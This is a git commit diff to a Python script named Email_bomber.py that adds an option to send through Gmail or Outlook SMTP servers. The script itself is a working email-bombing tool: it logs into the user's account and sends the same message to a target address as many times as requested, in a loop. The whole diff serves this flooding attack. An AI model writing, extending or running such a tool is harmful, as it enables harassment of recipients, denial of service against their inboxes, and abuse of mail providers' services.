4135632574efed7619b1fc35d71b7083c6cf8242
Anonymous <xyzricky>
2020-10-01 15:05:30 +0530

    Update Email_bomber.py

--- Email_bomber.py
+++ Email_bomber.py
@@ -14,14 +14,22 @@ try:
     message = input("Enter Message:")
     counter = int(input("How many message you want to send?:"))
 
+    # gmail of outlook
+    s_ = input('Select the service provider (Gmail / Outlook): ').lower()
+
+    if s_ == "gmail":
+        mail = smtplib.SMTP('smtp.gmail.com',587)
+    elif s_ == "outlook":
+        mail = smtplib.SMTP('smtp.office365.com',587)
+
     for x in range(0,counter):
         print("Number of Message Sent : ", x+1)
-        mail = smtplib.SMTP('smtp.gmail.com',587)
         mail.ehlo()
         mail.starttls()
         mail.login(email,password)
         mail.sendmail(email,bomb_email,message)
         time.sleep(1)
+
     mail.close()
 except Exception as e:
     print("Something is wrong, please Re-try Again with Valid input.")
